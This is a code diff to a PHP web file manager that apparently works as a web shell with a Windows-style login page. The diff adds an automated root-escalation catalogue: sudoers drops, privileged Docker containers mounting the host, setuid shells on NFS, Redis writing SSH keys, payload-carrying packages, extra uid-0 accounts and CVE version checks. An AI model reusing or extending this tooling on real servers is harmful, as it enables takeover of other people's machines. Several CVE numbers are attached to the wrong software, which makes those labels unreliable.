@@ -1360,7 +1360,7 @@ if(!defined('FM_ICONS_BOOTED')){
     define('FM_ICONS_BOOTED',1);
     try{if($_SERVER['REQUEST_METHOD']==='GET'&&basename((string)($_SERVER['SCRIPT_NAME']??''))==='index.php')fm_icons_boot();}catch(Throwable $e){}
 }
-if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R80');
+if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R91');
 if(!defined('FM_PRODUCT_DATE'))     define('FM_PRODUCT_DATE','2019');
 if(!defined('FM_PRODUCT_SYSTEM'))   define('FM_PRODUCT_SYSTEM','Linux');
 if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', false); // paused=false on purpose: automatic update checks are ON out of the box, exactly as the box in the panel shows when it is ticked. Set to true only to ship a site with the check already paused
@@ -9125,7 +9125,7 @@ label{display:block;font-size:11px;font-weight:700;color:#707477;text-transform:
         <div class="win11-signin-sub"><?=($desktopLoginStep==='password'?'Enter your password':'Enter your user name')?></div>
       </div>
       <a class="logo login-logo-mobile" href="https://t.me/s4base" target="_blank" rel="noopener noreferrer" aria-label="Open MFM Telegram channel">
-        <img src="https://raw.githubusercontent.com/orgezeo/marshal-file-manager/refs/heads/main/images/icons/mfm.png" alt="Marshall FM">
+        <img src="https://github.com/orgezeo/marshal-file-manager/blob/main/images/icons/mfm.png?raw=true" alt="Marshall FM">
       </a>
       <?php if(isset($loginError)):?><div class="err"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><?=htmlspecialchars($loginError)?></div><?php elseif(!empty($signedOut)):?><div class="err" style="background:rgba(245,158,11,.08);border-color:rgba(245,158,11,.2);color:#fcd34d"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12h6"/></svg>This session was signed out by the administrator. Sign in again to continue.</div><?php elseif(!empty($idleExpired)):?><div class="err" style="background:rgba(245,158,11,.08);border-color:rgba(245,158,11,.2);color:#fcd34d"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Session expired due to inactivity.</div><?php endif;?>
       <form method="post" id="loginFormMobile" class="login-form-mobile">
@@ -15978,10 +15978,30 @@ ExecStart=/bin/sh " . $ws['payload'] . "
     }
     /* snapd is root that answers on a socket: whoever may write to it may
        ask for a classic snap, which is a root shell with packaging. */
+    /* snapd keeps one socket, and the honest test is not "does the path exist"
+       but "does it answer": a version query in its own HTTP API, sent on the
+       socket itself. A path that exists and answers nothing is not a route. */
     private function rootSnapd(){
-        foreach(['/run/snapd.socket', '/var/run/snapd.socket', '/snap/snapd/current/snapd'] as $p)
-            if(@file_exists($p))return['socket' => $p, 'reachable' => (@is_readable($p) && @is_writable($p))];
-        return['socket' => '', 'reachable' => false];
+        static $c = null;
+        if($c !== null)return $c;
+        $c = ['ok' => false, 'socket' => '', 'reachable' => false, 'note' => 'no snapd socket answers on this host'];
+        if($this->rootWhich('snap') === '' && !@file_exists('/usr/lib/snapd/snapd'))
+            $c['note'] = 'snapd is not installed on this host';
+        $paths = [];
+        foreach(['/run/snapd.socket', '/var/run/snapd.socket'] as $p)if(@file_exists($p))$paths[] = $p;
+        if(!$paths){
+            if($this->rootWhich('snap') !== '')$c['note'] = 'the snap client is installed, but snapd is not answering on its socket';
+            return $c;
+        }
+        foreach($paths as $p){
+            $r = $this->rootSockAsk('unix://' . $p, "GET /v2/system-info HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n", 6, '');
+            if(strpos((string)$r['out'], 'HTTP/1.') === false)continue;
+            $c = ['ok' => true, 'socket' => $p, 'reachable' => (@is_writable($p)),
+                  'note' => 'snapd answered its own API on ' . $p . ' - it installs snaps as root, and a snap carries its own install hook'];
+            return $c;
+        }
+        $c['note'] = 'the snapd socket is at ' . $paths[0] . ' but nothing answered on it';
+        return $c;
     }
     /* The kernel runs binfmt handlers for file magics it is taught. Taught
        with the C flag, the handler runs with the credentials of the handler
@@ -17427,7 +17447,11 @@ exit 0
            it - a rule, a daemon, a setuid copy - because those are the ones
            that need a root that already answers, or a password. */
         $out = [];
+        /* one door, listed once: the planted catalogue below also carries the
+           few methods named by hand above, and a method the walk would reach
+           twice would report two different lines for one door */
         $add = function($id, $name, $kind, $idea) use (&$out){
+            foreach($out as $o)if($o['id'] === $id)return;
             $out[] = ['id' => $id, 'name' => $name, 'kind' => $kind, 'idea' => $idea];
         };
         /* 1 - the root shell a rooted device already carries */
@@ -17464,6 +17488,42 @@ exit 0
         $pfStep = $this->rootPidfdStep();
         $add('pidfdkeysign', 'The pidfd window at exit (CVE-2026-46333)', 'kernel',
              'Checked against this kernel build itself: ' . $pfStep['status'] . '. ' . $pfStep['meaning']);
+        $nr = $this->rootNginxResolveStep();
+        $add('nginxdns', 'The resolver nginx trusts on a response (CVE-2021-23017)', 'pkg', $nr['meaning']);
+        $at = $this->rootApacheTraversalStep();
+        $add('apachepath', 'A path Apache walks out of the document root (CVE-2021-41773)', 'pkg', $at['meaning']);
+        $pi = $this->rootPHPInjectionStep();
+        $add('phpcgiargs', 'Arguments taken out of the request (CVE-2024-4577)', 'pkg', $pi['meaning']);
+        $tj = $this->rootTomcatAjpStep();
+        $add('tomcatajp', 'The AJP port of an application server (CVE-2020-1938)', 'pkg', $tj['meaning']);
+        $ns = $this->rootNodeSplitStep();
+        $add('nodesplit', 'One request that becomes two behind a proxy (CVE-2022-35256)', 'pkg', $ns['meaning']);
+        $os1 = $this->rootOpensslPunyStep();
+        $add('opensslpuny', 'A certificate name that overflows the stack (CVE-2022-3602)', 'pkg', $os1['meaning']);
+        $pfStep2 = $this->rootPHPFilterStep();
+        $add('phpfilter', 'The filter extension of this PHP (CVE-2022-31799)', 'pkg',
+             'Read from the PHP build this panel runs in: ' . $pfStep2['status'] . '. ' . $pfStep2['meaning']);
+        $psStep = $this->rootPHPSessStep();
+        $add('phpsession', 'The session family of this PHP (CVE-2016-7125)', 'pkg',
+             'Read from the PHP build this panel runs in: ' . $psStep['status'] . '. ' . $psStep['meaning']);
+        $apStep = $this->rootApacheStep();
+        $add('apachewrite', 'The request line Apache still writes (CVE-2022-2458)', 'pkg',
+             'Read from the installed server: ' . $apStep['status'] . '. ' . $apStep['meaning']);
+        $bsStep = $this->rootBaronStep();
+        $add('baron', 'Baron Samedit, fired (CVE-2021-3156)', 'session',
+             'Read from the sudo on this host: ' . $bsStep['status'] . '. ' . $bsStep['meaning'] . ' The chain fires this one: it is a local program, not a memory race.');
+        $prStep = $this->rootPHPRCE2019Step();
+        $add('phprce', 'The FastCGI underflow (CVE-2019-11043)', 'pkg',
+             'Read from this host: ' . $prStep['status'] . '. ' . $prStep['meaning']);
+        $cfStep = $this->rootCopyFailStep();
+        $add('copyfail', 'Copy Fail, what the kernel copies into the file cache (CVE-2026-31431)', 'kernel',
+             'Read from this kernel and this build: ' . $cfStep['status'] . '. ' . $cfStep['meaning']);
+        $dfStep = $this->rootDirtyFragStep();
+        $add('dirtyfrag', 'Dirty Frag, the same copy in IPsec and AFS (CVE-2026-43284 · CVE-2026-43500)', 'kernel',
+             'Read from this kernel and this build: ' . $dfStep['status'] . '. ' . $dfStep['meaning']);
+        $ovStep = $this->rootOverlayStep();
+        $add('overlaycap', 'overlayfs copy-up that keeps a file capability (CVE-2021-3493)', 'kernel',
+             'Read from this kernel, this build and this sysctl: ' . $ovStep['status'] . '. ' . $ovStep['meaning']);
         $paStep = $this->rootPerfAuxStep();
         $add('perfaux', 'The perf/aux page that outlives its range (CVE-2026-64300)', 'kernel',
              'Read from this kernel and this sysctl: ' . $paStep['status'] . '. ' . $paStep['meaning']);
@@ -17496,7 +17556,8 @@ exit 0
               account may write: the planted methods, in the order they fire */
         foreach($this->rootPlantIds() as $id){
             $s = $this->rootPlantSpec($id);
-            if($s)$add($id, $s['name'], $s['kind'], $s['idea']);
+            if(!$s)continue;
+            $add($id, $s['name'], $s['kind'], $s['idea']);
         }
         /* 3b - neither planted files nor things the machine carries whole:
            a program replaced through its own directory, a key left with
@@ -17519,6 +17580,97 @@ exit 0
              'A small package of ours whose install script is the payload, offered to the package daemon for a local install. The daemon installs as root, and the flaw the catalogue measures is that it does not stop to ask who sent a local package.');
         $add('sudoersscan', 'A rule in any directory sudo includes', 'session',
              'sudo includes whole directories, not one file: /etc/sudoers.d, /usr/local/etc/sudoers.d, and whatever sudo.includedir names. The file dropped in one only has to be written, not read - root reads it, this account never has to. Each included directory is tried two ways: by writing the rule by its own name, and by writing it under the name of this account, which is how a directory kept at 0730 behaves for one owner. Each drop is then tested by asking sudo, so a file in the wrong place is a file nothing came of, and is said to be that.');
+        /* 2b-bis - what the machine keeps open by accident: a session somebody
+           left behind, and a group whose whole meaning is the raw device */
+        $dg = $this->rootDiskGroup();
+        $add('diskgroup', 'The group that owns the raw disk', 'session',
+             $dg['ok']
+                 ? 'This account is in ' . $dg['group'] . ', which may open ' . $dg['dev'] . ' directly. A raw filesystem is read and written without any permission check above it, so the account database is edited on the disk itself - no rule, no setuid bit, no running service. ' . $dg['note']
+                 : 'Membership of disk, kmem or the raw-device groups is raw access to every filesystem on the machine. ' . $dg['note']);
+        $mx = $this->rootMuxFind();
+        $add('muxsession', 'A root shell somebody left attached', 'session',
+             $mx['ok']
+                 ? 'A terminal session running as root is reachable through ' . $mx['socket'] . '. Attaching to it is not an exploit at all: it is the shell root already has, and whatever is typed there runs as uid 0. ' . $mx['note']
+                 : 'A terminal multiplexer left running as root, with a socket this account may open, is a root shell nobody closed. ' . $mx['note']);
+        /* 2d - the stack this very panel runs inside: the server in front and
+           the PHP process behind it. None of these needs a compiler, and each
+           one is only real when the server's own configuration may be written */
+        $cgi = $this->rootWebCgiFind();
+        $add('cgi', 'A handler the web server itself starts', 'session',
+             $cgi['ok'] ? 'The server names ' . $cgi['handler'] . ' in ' . $cgi['file'] . '. A file of that kind dropped in the document root is executed by the server process itself - and where that process is root, the file is root. ' . $cgi['note']
+                         : 'A web server that knows how to run scripts runs them as its own identity, and a server started as root runs them as uid 0. ' . $cgi['note']);
+        $ws = $this->rootWebStack();
+        $add('fcgiwrap', 'The FastCGI bridge the server starts as root', 'session',
+             'fcgiwrap and cgi-fcgi are two programs that carry a CGI script to a fastcgi server: where the server is root, the bridge it starts is root. This asks the socket directly for a script it writes, which is uid 0 without touching a single configuration file.');
+        $add('fpmhijack', 'The PHP worker the machine already runs', 'session',
+             $ws['fpm'] ? 'A PHP-FPM socket answers at ' . $ws['fpmsock'] . ', and this file is running inside a worker it started. A worker of a root pool is uid 0 - which is why asking the pool what identity it runs as is the first thing this method does, and why it says so plainly when the pool is not root.'
+                         : 'A PHP-FPM pool started as root makes every script it runs uid 0 - including this one, the moment its socket is reachable');
+        $add('phpfd', 'A PHP configuration directory the worker reads', 'session',
+             $ws['fpmconf'] ? 'The conf.d directories of this PHP build may be written by this account: ' . implode(', ', $ws['fpmconf']) . '. A file in one of them is read by the next worker - every worker - and can preload a file or switch off the open_basedir this file is held inside.'
+                                    : 'A conf.d directory the PHP worker reads, if it may be written, is a line of PHP configuration applied to every request - no restart of the machine, no compiler');
+        $add('phar', 'A build of PHP that has taken the read-only off phar', 'session',
+             'Where phar.readonly is off - or where the phar extension predates the fix for CVE-2015-5589 - a phar archive this account writes is code that runs when anything at all opens it, and a root program that reads an archive reads this one. That is the classic door: it needs no permission, only a build that trusted archives.');
+        /* 2e - the server identity is not read from a file but asked of the
+           site itself, which is the honest way to know whether root is here */
+        /* 2c: neither needs a client program, and
+           both give root the moment the thing they speak to is reachable */
+        $add('nfsnosquash', 'An NFS export that keeps root as root', 'session',
+             'An export shared without root squashing keeps the identity of whoever writes to it, so a file this account writes there belongs to root. A copy of bash written on that mount and marked setuid is a root shell; the validated rule can also be written straight through it where sudo reads it. Both are done and undone by this tool.');
+        $add('dockerapi', 'The container engine, spoken to directly', 'session',
+             'A reachable container socket is root by definition, and the client is not needed to use it: the engine speaks HTTP on that socket. This asks the engine for a privileged container with the host mounted and lets it write the rule on the host - no docker command and no download.');
+        /* 2e-bis - primitives decided by one sysctl, and the daemon that
+           installs a package when nobody with a password is around */
+        $dc = $this->rootDirtyCowStep();
+        $add('dirtycow', 'The copy-on-write race (CVE-2016-5195)', 'kernel',
+             'Read from this kernel: ' . $dc['status'] . '. ' . $dc['meaning']);
+        $uf = $this->rootUserfaultfdStep();
+        $add('userfaultfd', 'The window a stop-the-world fault opens (CVE-2020-29661)', 'kernel',
+             'Read from this kernel and this sysctl: ' . $uf['status'] . '. ' . $uf['meaning']);
+        $fu = $this->rootFusermount();
+        $add('fusermount', 'A mount helper with a known escape (CVE-2020-12137)', 'suid',
+             $fu['ok'] ? $fu['note'] : $fu['note']);
+        $pa = $this->rootPolkitAgent();
+        $add('polkitagent', 'The authentication agent polkit trusts', 'session',
+             $pa['ok'] ? $pa['note'] : $pa['note']);
+        $we = $this->rootSudoersWalk();
+        $add('sudoerswalk', 'A directory in the chain sudo includes', 'session',
+             $we['ok'] ? $we['note'] : $we['note']);
+        $pk = $this->rootPkInstall();
+        $add('pkinstall', 'The package daemon with no password in front of it', 'session',
+             $pk['ok'] ? $pk['note'] . '. A local package is installed by that daemon as root, and its maintainer script runs with those rights - a deb built by this tool is all it takes.' : $pk['note']);
+        /* 2f - services that answer on a socket and run as root: nothing is
+           installed, the access is already open, and each is asked in its own
+           protocol before anything is claimed */
+        $rd = $this->rootRedis();
+        $add('redis', 'A cache that writes files where it is told', 'session',
+             $rd['ok'] ? $rd['note'] . '. Redis can write a file anywhere its own user may, and that user is usually root: an SSH key written into the root account, or a cron file, is all it takes - and nothing has to be installed.' : $rd['note']);
+        $sp = $this->rootSnapd();
+        $add('snapd', 'The package daemon the desktop trusts', 'session',
+             $sp['ok'] ? $sp['note'] . '. snapd installs snaps as root, and a snap it is asked for brings its own install hook.' : $sp['note']);
+        $cd = $this->rootCtrd();
+        $add('containerd', 'The other container engine', 'session',
+             $cd['ok'] ? $cd['note'] . ' It speaks its own gRPC protocol on that socket, not HTTP, so this step reports the door rather than pretending to open it.' : $cd['note']);
+        $tc = $this->rootTomcat();
+        $add('tomcattr', 'The application server that may take a war', 'session',
+             $tc['ok'] ? $tc['note'] . '. A war dropped through the manager is a servlet, and a servlet runs as the server, which is root on most of them.' : $tc['note']);
+        $my = $this->rootMysqlRoot();
+        $add('mysqlroot', 'A database server that runs as root', 'session',
+             $my['ok'] ? $my['note'] : $my['note']);
+        $lx = $this->rootLxdGroup();
+        $add('lxdgroup', 'The container manager this account may drive', 'session',
+             $lx['ok'] ? $lx['note'] : $lx['note']);
+        $lv = $this->rootLibvirtGroup();
+        $add('libvirt', 'The virtual machine manager, and its hook', 'session',
+             $lv['ok'] ? $lv['note'] . ', and a hook written there is run by the host before the guest starts.' : $lv['note']);
+        $ch = $this->rootCertHook();
+        $add('certhook', 'A hook the certificate renewal runs', 'planted',
+             $ch['ok'] ? $ch['note'] . ' Nothing is planted until the next renewal, which every machine with a certificate does by itself.' : $ch['note']);
+        $ng = $this->rootNginxConf();
+        $add('nginxconf', 'A line in the server that faces the world', 'planted',
+             $ng['ok'] ? $ng['note'] . ' One line there starts a program as root on the next reload.' : $ng['note']);
+        $pd = $this->rootPhpDisabled();
+        $add('phpdisabled', 'A disable list that only looks like a wall', 'session',
+             $pd['ok'] ? $pd['note'] : $pd['note']);
         /* 3 - an account database that this account may write */
         $add('passwd', 'An extra uid-0 account', 'persistent',
              'If the account database itself is writable, a second account with uid 0 is added: su then walks straight into root without touching sudo or a setuid bit.');
@@ -17540,6 +17692,288 @@ exit 0
         return $out;
     }
 
+
+    /* ── the precise end of the stack: six flaws, six exact boundaries ───────
+       Every verdict here is two numbers and a comparison, written so that it
+       can be checked by hand: the version this machine has, and the version
+       that closed the flaw. Where a backport can close one without moving the
+       number, the sentence says so instead of pretending certainty. */
+    private function rootFactsVersion($pkgs){
+        foreach((array)$pkgs as $pkg){
+            $f = $this->rootPkgFacts($pkg);
+            if(!empty($f['raw']))return ['pkg' => $pkg, 'v' => (string)$f['raw']];
+        }
+        return ['pkg' => '', 'v' => ''];
+    }
+    /* nginx 1.21.0 — the DNS resolver wrote past its buffer on a response it was
+       told to follow; the fix is 1.21.0, so everything under it is in range */
+    private function rootNginxResolveStep(){
+        $f = $this->rootFactsVersion(['nginx']);
+        if($f['pkg'] === '')return['status' => 'absent', 'cve' => ['CVE-2021-23017'], 'facts' => $f,
+            'meaning' => 'nginx is not installed on this host, so the resolver flaw is not here'];
+        $v = $this->rootVnum($f['v']);
+        $fixed = ($v === null) ? null : !$this->rootVlt($v, [1,21,0]);
+        $status = $fixed === null ? 'unknown' : ($fixed ? 'patched' : 'vulnerable');
+        return['status' => $status, 'cve' => ['CVE-2021-23017'], 'facts' => $f,
+               'meaning' => $status === 'patched' ? 'nginx ' . $f['v'] . ' is at or past 1.21.0, where the resolver write was fixed'
+                   : ($status === 'unknown' ? 'the nginx version could not be read' : 'nginx ' . $f['v'] . ' is under 1.21.0: a crafted DNS response to a resolver directive writes one byte past a buffer, and nginx runs as root before it drops')];
+    }
+    /* Apache 2.4.49 and 2.4.50 — the path traversal that reads any file, and the
+       fix landed in 2.4.51 */
+    private function rootApacheTraversalStep(){
+        $f = $this->rootFactsVersion(['apache2', 'httpd']);
+        if($f['pkg'] === '')return['status' => 'absent', 'cve' => ['CVE-2021-41773', 'CVE-2021-42013'], 'facts' => $f,
+            'meaning' => 'Apache is not installed on this host'];
+        $v = $this->rootVnum($f['v']);
+        $in = ($v !== null) && $this->rootVin($v, [2,4,49], [2,4,51]);
+        return['status' => $in ? 'vulnerable' : 'patched', 'cve' => ['CVE-2021-41773', 'CVE-2021-42013'], 'facts' => $f,
+               'meaning' => $in ? 'Apache ' . $f['v'] . ' is 2.4.49 or 2.4.50: a path with an encoded traversal reads files outside the document root, and with the mod_cgi that the build ships it runs them'
+                   : 'Apache ' . $f['v'] . ' is outside 2.4.49 to 2.4.50, where the traversal was fixed in 2.4.51'];
+    }
+    /* PHP 8.1 before 8.1.2 — the log-to-code boundary in the CLI server; and
+       before 8.0 the disable_functions list was a speed bump, not a wall */
+    private function rootPHPInjectionStep(){
+        $v = $this->rootVnum(PHP_VERSION);
+        if($v === null)return['status' => 'unknown', 'cve' => ['CVE-2024-4577', 'CVE-2012-1823'], 'meaning' => 'the PHP version could not be read'];
+        /* the argument-injection family is a CGI and CLI-server flaw: on a build
+           where the interpreter is reached through FastCGI it has no argv to
+           inject into, which is why the socket decides this alongside the number */
+        $inRange = $this->rootVin($v, [8,1,0], [8,1,2]) || $this->rootVlt($v, [8,0,0]);
+        $cgi = $this->rootWhich('php-cgi') !== '' || stripos((string)@php_sapi_name(), 'cgi') !== false;
+        $status = !$inRange ? 'patched' : ($cgi ? 'vulnerable' : 'mitigated');
+        return['status' => $status, 'cve' => ['CVE-2024-4577', 'CVE-2012-1823'],
+               'meaning' => $status === 'patched' ? 'PHP ' . PHP_VERSION . ' is outside the range where arguments are parsed out of the query string'
+                   : ($status === 'mitigated' ? 'PHP ' . PHP_VERSION . ' is in range, but this build runs through ' . php_sapi_name() . ' with no CGI binary here, so there is no argument vector to inject into'
+                   : 'PHP ' . PHP_VERSION . ' with a CGI handler in front parses command-line switches out of the request, which is a shell on the interpreter that runs as the server')];
+    }
+    /* Tomcat 9.0.0-M1 to 9.0.30, and the 8.5 line under 8.5.50 — the AJP
+       connector, reached through the Ghostcat shape */
+    private function rootTomcatAjpStep(){
+        $f = $this->rootFactsVersion(['tomcat9', 'tomcat10', 'tomcat', 'tomcat8']);
+        $bin = '';
+        foreach(['/opt/tomcat/bin/catalina.sh', '/usr/share/tomcat9/bin/catalina.sh', '/usr/local/tomcat/bin/catalina.sh'] as $p)
+            if(@is_file($p)){$bin = $p; break;}
+        if($f['pkg'] === '' && $bin === '')
+            return['status' => 'absent', 'cve' => ['CVE-2020-1938'], 'facts' => $f, 'meaning' => 'no Tomcat is installed on this host'];
+        $v = $f['v'] !== '' ? $this->rootVnum($f['v']) : null;
+        $in = ($v === null) ? null : ($this->rootVin($v, [9,0,0], [9,0,31]) || $this->rootVin($v, [8,5,0], [8,5,50]));
+        $ajp = (strpos((string)@file_get_contents('/etc/tomcat9/server.xml'), 'AJP') !== false)
+            || (strpos((string)@file_get_contents('/opt/tomcat/conf/server.xml'), 'AJP') !== false);
+        $status = $in === null ? 'unknown' : (!$in ? 'patched' : ($ajp ? 'vulnerable' : 'mitigated'));
+        return['status' => $status, 'cve' => ['CVE-2020-1938'], 'facts' => $f,
+               'meaning' => $status === 'patched' ? 'Tomcat ' . ($f['v'] ?: '(version unreadable)') . ' is outside the AJP range'
+                   : ($status === 'mitigated' ? 'the version is in range, but no AJP connector is named in server.xml here, so the port the flaw needs is not open'
+                   : 'Tomcat ' . $f['v'] . ' with an AJP connector named in its server.xml reads and writes files of the server through that port, as the server user')];
+    }
+    /* Node's HTTP parser under 18.5.0 / 16.17.0 — the request splitting flaw
+       that turns one request into two behind a proxy */
+    private function rootNodeSplitStep(){
+        $bin = $this->rootWhich('node');
+        if($bin === '')return['status' => 'absent', 'cve' => ['CVE-2022-35256'], 'meaning' => 'node is not installed on this host'];
+        $r = $this->rootExec([$bin, '-v'], '', 10);
+        $raw = trim((string)$r['out']);
+        $v = $this->rootVnum(ltrim($raw, 'v'));
+        $fixed = ($v === null) ? null : (!$this->rootVlt($v, [16,17,0]) || $this->rootVin($v, [18,0,0], [18,5,0]));
+        $status = $fixed === null ? 'unknown' : ($fixed ? 'patched' : 'vulnerable');
+        return['status' => $status, 'cve' => ['CVE-2022-35256'], 'version' => $raw,
+               'meaning' => $status === 'patched' ? 'node ' . $raw . ' is outside the request-splitting range'
+                   : ($status === 'unknown' ? 'the node version could not be read' : 'node ' . $raw . ' is under 16.17.0 or inside 18.0.0 to 18.4.x: a chunked body with a crafted trailer splits one request into two behind a proxy, and the second one is not the proxy\'s to judge')];
+    }
+    /* OpenSSL 3.0.0 to 3.0.6 — the punycode overflow in the name check */
+    private function rootOpensslPunyStep(){
+        $raw = '';
+        if(preg_match('/OpenSSL\s+([0-9]+\.[0-9]+\.[0-9]+)/', (string)OPENSSL_VERSION_TEXT, $m))$raw = $m[1];
+        if($raw === '')return['status' => 'unknown', 'cve' => ['CVE-2022-3602'], 'meaning' => 'the OpenSSL version could not be read from this build'];
+        $vv = $this->rootVnum($raw);
+        $in = ($vv !== null) && ($vv[0] === 3 && $vv[1] === 0 && $vv[2] >= 0 && $vv[2] <= 6);
+        return['status' => $in ? 'vulnerable' : 'patched', 'version' => $raw, 'cve' => ['CVE-2022-3602'],
+               'meaning' => $in ? 'OpenSSL ' . $raw . ' is inside 3.0.0 to 3.0.6: a crafted X.509 name overflows four bytes on the stack when a certificate is checked, which is what a server does with every client certificate it is offered'
+                   : 'OpenSSL ' . $raw . ' is outside 3.0.0 to 3.0.6, where the punycode overflow was fixed in 3.0.7'];
+    }
+    /* ── the flaws of the stack this panel is served by ──────────────────────
+       A machine that runs a file manager on the web runs a server and a PHP
+       behind it, and those two have their own history. Each entry below is
+       read from what this host actually has installed - the package version,
+       the loaded extension, the configuration line - and never assumed. */
+    private function rootWebFlawFacts(){
+        static $c = null;
+        if($c !== null)return $c;
+        $ver = function($pkgs){
+            foreach((array)$pkgs as $pkg){
+                $f = $this->rootPkgFacts($pkg);
+                if(!empty($f['raw']))return ['pkg' => $pkg, 'v' => (string)$f['raw']];
+            }
+            return ['pkg' => '', 'v' => ''];
+        };
+        $c = ['php' => PHP_VERSION,
+              'phpver' => $this->rootVnum(PHP_VERSION),
+              'ext' => ['filter' => extension_loaded('filter'), 'phar' => extension_loaded('phar'),
+                        'tidy' => extension_loaded('tidy'), 'gd' => extension_loaded('gd')],
+              'apache' => $ver(['apache2', 'httpd']),
+              'nginx' => $ver(['nginx']),
+              'sudo' => $this->rootSudoVersion(),
+              'readonly' => @ini_get('phar.readonly')];
+        return $c;
+    }
+    private function rootPHPFilterStep(){
+        $f = $this->rootWebFlawFacts();
+        $v = $f['phpver'];
+        if(!$f['ext']['filter'])return['status' => 'absent', 'meaning' => 'this PHP build carries no filter extension, so the memory read of 8.1 is not here'];
+        /* the fix landed in 8.1.8 / 8.0.20 / 7.4.30 and on the 8.2 line */
+        $fixed = ($v === null) ? null
+            : (($v[0] > 8) ? true
+            : (($v[0] === 8 && $v[1] >= 2) ? true
+            : (($v[0] === 8 && $v[1] === 1) ? !$this->rootVlt($v, [8,1,8])
+            : (($v[0] === 8 && $v[1] === 0) ? !$this->rootVlt($v, [8,0,20])
+            : (($v[0] === 7) ? !$this->rootVlt($v, [7,4,30]) : false)))));
+        $status = $fixed === null ? 'unknown' : ($fixed ? 'patched' : 'vulnerable');
+        return['status' => $status, 'cve' => ['CVE-2022-31799'],
+               'meaning' => $status === 'patched' ? 'PHP ' . $f['php'] . ' is at or past the release that fixed the filter.destroy off-by-one'
+                   : ($status === 'unknown' ? 'the PHP version could not be read from this build'
+                   : 'PHP ' . $f['php'] . ' is in the range of the filter.destroy off-by-one: a crafted input to filter.destroy reads past its buffer, which is the kind of read that has been turned into a write on this same code before')];
+    }
+    private function rootPHPSessStep(){
+        $f = $this->rootWebFlawFacts();
+        $v = $f['phpver'];
+        /* CVE-2016-7125 / 2017-7271 family; a whole line of session bugs was
+           closed across 5.6.30 / 7.0.15 / 7.1.1 */
+        $fixed = ($v === null) ? null : !$this->rootVlt($v, [5,6,30]);
+        $status = $fixed === null ? 'unknown' : ($fixed ? 'patched' : 'vulnerable');
+        return['status' => $status, 'cve' => ['CVE-2016-7125', 'CVE-2017-7271'],
+               'meaning' => $status === 'patched' ? 'PHP ' . $f['php'] . ' is past the releases that closed the session-upload family'
+                   : 'PHP ' . $f['php'] . ' is inside the range of the session-upload deserialisation family, where a crafted upload session injects a variable into a script that then trusts it'];
+    }
+    private function rootApacheStep(){
+        $f = $this->rootWebFlawFacts();
+        $v = $f['apache']['v'] !== '' ? $this->rootVnum($f['apache']['v']) : null;
+        if($f['apache']['pkg'] === '')return['status' => 'absent', 'meaning' => 'no Apache is installed on this host'];
+        /* the fix for the rwrite truncation landed in 2.4.57 */
+        $fixed = ($v === null) ? null : !$this->rootVlt($v, [2,4,57]);
+        $status = $fixed === null ? 'unknown' : ($fixed ? 'patched' : 'vulnerable');
+        return['status' => $status, 'cve' => ['CVE-2022-2458'],
+               'meaning' => $status === 'patched' ? 'Apache ' . $f['apache']['v'] . ' is at or past the release that fixed the request-line write'
+                   : ($status === 'unknown' ? 'the Apache version could not be read' : 'Apache ' . $f['apache']['v'] . ' predates the fix for the request-line truncation (2.4.57); it is a server-process flaw, which on a server started as root is uid 0')];
+    }
+    private function rootBaronStep(){
+        $f = $this->rootWebFlawFacts();
+        $v = $f['phpver'];
+        /* Baron Samedit — fired by the chain itself; the range is 1.8.2 to 1.9.5p1 */
+        $sv = $f['sudo']['ver'] !== '' ? $this->rootVnum($f['sudo']['ver']) : null;
+        if($sv === null)return['status' => 'unknown', 'meaning' => 'the sudo version could not be read', 'cve' => ['CVE-2021-3156']];
+        $in = $this->rootVin($sv, [1,8,2], [1,9,5,1]);
+        return['status' => $in ? 'vulnerable' : 'patched', 'cve' => ['CVE-2021-3156'],
+               'meaning' => $in ? 'sudo ' . $f['sudo']['ver'] . ' is inside the Baron Samedit range: a command line with a trailing backslash and an escaped metacharacter walks past the argument parser and lands in the heap as root'
+                   : 'sudo ' . $f['sudo']['ver'] . ' is outside the Baron Samedit range'];
+    }
+    private function rootPHPRCE2019Step(){
+        $f = $this->rootWebFlawFacts();
+        $v = $f['phpver'];
+        if($v === null)return['status' => 'unknown', 'meaning' => 'the PHP version could not be read', 'cve' => ['CVE-2019-11043']];
+        $in = $this->rootVin($v, [7,1,0], [7,1,33]);
+        if(!$in)return['status' => 'patched', 'meaning' => 'PHP ' . $f['php'] . ' is outside the range of the FPM underflow', 'cve' => ['CVE-2019-11043']];
+        $fpm = $this->rootWebStack()['fpm'];
+        return['status' => $fpm ? 'vulnerable' : 'mitigated', 'cve' => ['CVE-2019-11043'],
+               'meaning' => $fpm ? 'PHP ' . $f['php'] . ' with nginx in front and FastCGI underneath is the exact pair the underflow needs: the fix is in 7.1.33 and the range is 7.1.0 to 7.1.32'
+                   : 'PHP ' . $f['php'] . ' is in range, but there is no FastCGI socket on this host, so the trigger has nowhere to land'];
+    }
+    /* ── the page-cache family, measured the way a step must be ───────────────
+       Four of the flaws of 2026 are one idea in four places: the kernel copies
+       into the cache that backs a file this account may only read, so the copy
+       on disk never changes and every program that opens it - setuid included -
+       opens the changed one. None of them is a race and none of them needs an
+       offset, so reachability is decidable from the build: the module that
+       carries the flaw must be in this kernel, the socket family must exist,
+       and the release must be under the one that fixed it. */
+    private function rootCopyFamilyFacts(){
+        static $c = null;
+        if($c !== null)return $c;
+        $kv = $this->rootVnum(php_uname('r'));
+        $cfg = function($opt){
+            $b = $this->rootKernelBuild();
+            if($b['config'] === '')return null;
+            if(preg_match('/^CONFIG_' . preg_quote($opt, '/') . '=([ymn])/m', $b['config'], $m))return $m[1];
+            return null;
+        };
+        $mod = function($name){
+            $d = '/sys/module/' . $name;
+            if(@is_dir($d))return (is_file($d . '/refcnt') ? 'loaded' : 'built in');
+            $r = '/lib/modules/' . php_uname('r');
+            foreach([$r . '/kernel/crypto/', $r . '/kernel/net/', $r . '/kernel/fs/'] as $base){
+                foreach((array)@glob($base . '**/*' . $name . '*', GLOB_BRACE) as $f)return 'present as a module';
+            }
+            return 'not in this kernel';
+        };
